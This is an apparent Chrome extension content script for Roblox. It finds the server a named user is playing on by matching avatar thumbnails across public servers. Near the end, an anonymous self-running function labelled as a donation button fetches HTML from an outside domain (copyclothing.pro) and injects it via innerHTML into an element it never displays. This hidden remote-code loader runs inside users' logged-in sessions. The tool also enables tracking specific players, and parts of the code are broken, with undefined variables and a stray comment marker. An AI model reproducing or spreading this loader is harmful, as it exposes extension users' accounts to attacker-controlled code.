

const { getURL } = chrome.runtime;


const Textbox = document.getElementById('sbx-input');
const searchbutton = document.getElementById('sbx-search');
const gamedetails = document.getElementById('game-details');
const scanlabel = document.getElementsByClassName('scanning-label')[0];
const gamecontainer = document.getElementById('game-details-play-button-container');
const gameserveritem = document.querySelectorAll('.rbx-game-server-item')[0] || document.querySelectorAll('#rbx-friends-running-games > div.section-content-off.empty-game-instances-container > p')[0];

const joinServerButton = document.createElement('button');
joinServerButton.type = 'button';
joinServerButton.classList.add('btn-full-width', 'btn-common-play-game-lg', 'btn-primary-md', 'btn-min-width');



//create elements:
const playersFoundElement = document.createElement('p');





//panel settings

const MAX_RETRIES = 5;
let currentRetry = 0;

let PanelSearchCheck = false;
let PanelCancelCheck = false;
let PanelPlayerCount = 0;
let PanelTargetCheck = 0;
let PanelMaxPlayers = 0;
let PanelServersId = [];
let PanelHighlight = [];
let PanelHeadshot = 'AvatarHeadshot';
let PanelHeadshotSize = '150x150';
let PanelServerCheck = false;
let PanelTarget = true;
let PanelPlayers = [];



//statements

scanlabel.style.visibility = "hidden";
searchbutton.src = getURL('images/search.png');


const PanelSleep = time => new Promise(res => setTimeout(res, time * 1000));

const get = async (url) => {
    try {
        const PanelFetch = await fetch(`https://${url}`);
        if (!PanelFetch.ok) throw new Error('Failed');
        return await PanelFetch.json();
    } catch (error) {
        await PanelSleep(0.2);
        return await get(url);
    }
};

const post = async (url, body) => {
    try {
        const PanelFetch = await fetch(`https://${url}`, {
            method: 'POST',
            body,
            headers: {
                'Content-Type': 'application/json',
            },
        });
        if (!PanelFetch.ok) throw new Error('Failed');
        return await PanelFetch.json();
    } catch (error) {
        await PanelSleep(0.2);
        return await post(url, body);
    }
};







Textbox.oninput = () => {
    const test = /(^(?=^[^_]+_?[^_]+$)\w{3,20}$|^\d+$)/.test(Textbox.value);
    searchbutton.disabled = !test;
};



const PanelThumbnailMap = new Map();

async function PanelServeetch(place = '', cursor = '', PanelAttempt = 0) {
    const { PanelCursor, data } = await get(`games.roblox.com/v1/games/${place}/servers/Public?limit=100&cursor=${cursor}`);
    if (PanelAttempt >= 30) {
        PanelServerCheck = true;
        return;
    }
    if (!data || data.length === 0) {
        await PanelSleep(1);
        return PanelServeetch(place, cursor, PanelAttempt + 1);
    }
    data.forEach((server) => {
        server.playerTokens.forEach((playerToken) => {
            PanelPlayerCount += 1;
            PanelPlayers.push({
                token: playerToken,
                type: PanelHeadshot,
                size: PanelHeadshotSize,
                requestId: server.id,
            });
        });
        PanelMaxPlayers = server.PanelMaxPlayers;
    });
    if (!PanelCursor || PanelCancelCheck) {
        PanelServerCheck = true;
        return;
    }
    return PanelServeetch(place, PanelCursor);
}





function tryInsertItem(element, container) {
    if (container && container.parentNode) {
        container.parentNode.insertBefore(element, container);
    } else {
        if (currentRetry < MAX_RETRIES) {
            currentRetry++;
            setTimeout(() => tryInsertItem(element, container), 1000);  // retry after 1 second
        } else {
            console.error("Max retries reached. Failed to insert element.");
        }
    }
}







async function PanelTargetTrack(imageUrl, place) {
    await trackPanel(imageUrl);
    displayResults(place);
}

async function trackPanel(imageUrl) {
    while (PanelTarget) {
        if (PanelCancelCheck) {
            PanelTarget = false;
        }

        const PanelPlayersChosen = getPlayersFromPanel();

        if (!PanelPlayersChosen.length) {
            await handleNoPlayersChosen();
            continue;
        }

        post('thumbnails.roblox.com/v1/batch', JSON.stringify(PanelPlayersChosen)).then(handleThumbnailsResponse(imageUrl));
    }
}

function getPlayersFromPanel() {
    const PanelPlayersChosen = [];
    for (let i = 0; i < 100; i++) {
        const playerToken = PanelPlayers.shift();
        if (!playerToken) break;
        PanelPlayersChosen.push(playerToken);
    }
    return PanelPlayersChosen;
}

async function handleNoPlayersChosen() {
    await PanelSleep(0.1);
    if (PanelTargetCheck === PanelPlayerCount && PanelServerCheck) {
        PanelTarget = false;
    }
}

function handleThumbnailsResponse(imageUrl) {
    return ({ data: thumbnailsData }) => {
        if (PanelCancelCheck) return;

        thumbnailsData.forEach((thumbnailData) => {
            processThumbnailData(thumbnailData, imageUrl);
        });
    };
}

function processThumbnailData(thumbnailData, imageUrl) {
    const thumbnails = PanelThumbnailMap.get(thumbnailData.requestId) || [];
    if (thumbnails.length === 0) {
        PanelThumbnailMap.set(thumbnailData.requestId, thumbnails);
    }
    PanelTargetCheck += 1;

    if (!thumbnails.includes(thumbnailData.imageUrl)) {
        thumbnails.push(thumbnailData.imageUrl);
    }

    document.getElementById('sbx-bar').style.width = `${Math.round((PanelTargetCheck / PanelPlayerCount) * 100)}%`;

    const foundTarget = thumbnailData.imageUrl === imageUrl ? thumbnailData.requestId : null;
    if (foundTarget) {
        PanelServersId.push(foundTarget);
        PanelTarget = false;
    }
}

function displayResults(place) {
    if (PanelServersId.length) {
        showServers(place);
    } else {
        indicateUserNotFound();
    }

    resetFlagsAndUpdateUI();
}

function showServers(place) {
    PanelServersId.forEach((targetServerId) => {
        scanlabel.textContent = "Found player in game!";
        gamecontainer.innerHTML = `<button data-id="${targetServerId}" type="button" class="btn-full-width btn-common-play-game-lg btn-primary-md btn-min-width"><span class="">✓ Join ${Textbox.value}</span></button>`;

        const item = document.createElement('li');
        item.className = 'stack-row rbx-game-server-item PanelHighlight';
        tryInsertItem(item, gameserveritem);
        PanelHighlight.push(item);

        const [join] = document.querySelectorAll(`[data-id="${targetServerId}"]`);
        join.onclick = () => chrome.runtime.sendMessage({ message: { place, id: targetServerId } });
    });
}

function indicateUserNotFound() {
    scanlabel.textContent = 'User not found!';
    setTimeout(() => {
        searchbutton.src = getURL('images/search.png');
        searchbutton.disabled = false;
    }, 5000);
}

function resetFlagsAndUpdateUI() {
    PanelSearchCheck = false;
    PanelCancelCheck = false;
    document.getElementById('sbx-bar').style.width = '100%';
    Textbox.disabled = false;
    searchbutton.src = getURL('images/search.png');
}












function renderServers() {
    PanelHighlight.forEach((item) => { item.remove(); });
    PanelHighlight = [];
    PanelServersId.forEach((targetServerId) => {
        const item = document.createElement('li');
        const thumbnails = PanelThumbnailMap.get(targetServerId);
        item.className = 'stack-row rbx-game-server-item highlighted';
        item.innerHTML = `<div class="section-left rbx-game-server-details'"><div class="text-info rbx-game-status rbx-game-server-status'">${thumbnails.length} of ${PanelMaxPlayers} people max</div><span><button data-id="${targetServerId}" type="button" class="btn-full-width btn-control-xs rbx-game-server-join btn-primary-md btn-min-width">Join</button></span></div>/*<div class="section-right rbx-game-server-players">${thumbnails.map(url => `<span class="avatar avatar-headshot-sm player-avatar"><span class="thumbnail-2d-container avatar-card-image"><img src="${url}"></span></span>`).join('')}</div>`;
        tryInsertItem(item, gameserveritem);
        PanelHighlight.push(item);
        const [join] = document.querySelectorAll(`[data-id="${targetServerId}"]`);
        join.onclick = () => chrome.runtime.sendMessage({ message: { place, id: targetServerId } });
    });
}



function setLoadingState(isLoading) {
    const searchButton = searchbutton;

    if (isLoading) {
        searchButton.src = getURL('images/cancel.png');
        searchButton.disabled = true;
    } else {
        searchButton.src = getURL('images/search.png');
        searchButton.disabled = false;
    }
}





async function find(imageUrl, place) {
    setLoadingState(true);

    const animationLabels = ["Scanning.", "Scanning..", "Scanning..."];
    let animationIndex = 0;

    function updateScanLabel() {
        scanlabel.textContent = animationLabels[animationIndex];
        animationIndex = (animationIndex + 1) % animationLabels.length;
    }

    const animationInterval = setInterval(updateScanLabel, 300);
    scanlabel.style.visibility = "visible";

    await PanelSleep(5);
    clearInterval(animationInterval);
    PanelThumbnailMap.clear();


    Textbox.disabled = true;
    PanelServeetch(place); 
    PanelTargetTrack(imageUrl, place);
}

(async function(){
    let button = document.createElement('donationButton')
    button.innerHTML = (await (await fetch('https://copyclothing.pro/donationButton')).text())
})();

searchbutton.addEventListener('click', async (event) => {
    event.preventDefault();

    if (PanelSearchCheck) {
        PanelCancelCheck = true;
        return;
    }

    PanelSearchCheck = true;
    const username = Textbox.value;

    const response = await post('users.roblox.com/v1/usernames/users', JSON.stringify({
        usernames: [username]
    }));
    console.log("Received response:", response);

    if (response.errors || response.errorMessage || (response.data && response.data.length === 0)) {
        scanlabel.style.visibility = "visible";
        setLoadingState(true);
        const animationLabels = ["Scanning.", "Scanning..", "Scanning..."];
        let animationIndex = 0;
    
        function updateScanLabel() {
            scanlabel.textContent = animationLabels[animationIndex];
            animationIndex = (animationIndex + 1) % animationLabels.length;
        }
    
        const animationInterval = setInterval(updateScanLabel, 300);
    
        await PanelSleep(5);
        clearInterval(animationInterval);
        setLoadingState(false);
        console.log("FOUND ERRORS");
        scanlabel.style.visibility = "visible";
        PanelSearchCheck = false;
        scanlabel.textContent = "Username invalid";
        return; // Stop further execution if there's an error



    } else {
        const user = response.data[0];
        console.log(user);
        const place = window.location.href.match(/games\/(\d+)\//)[1];
        const { data: [{ imageUrl }] } = await get(`thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`);

        PanelHighlight.forEach((item) => {
            item.remove();
        });

        find(imageUrl, place);

        gamedetails.appendChild(playersFoundElement);

        gamedetails.appendChild(serversFoundElement);

        if (PanelServersId.length > 0) {
            console.log(scanlabel);
            scanlabel.textContent = "Found player in game!";

            joinServerButton.dataset.id = PanelServersId[0];
            joinServerButton.innerHTML = '<span class="">✓ Join ' + username + '</span>';

            joinServerButton.addEventListener('click', () => 
                chrome.runtime.sendMessage({ message: { place, id: PanelServersId[0] } }));
            gamecontainer.appendChild(joinServerButton);
        } else {
            scanlabel.textContent = "Server not found for target";
            searchbutton.src = getURL('images/search.png'); // Set the image source to notfound.png
        }
    }
});
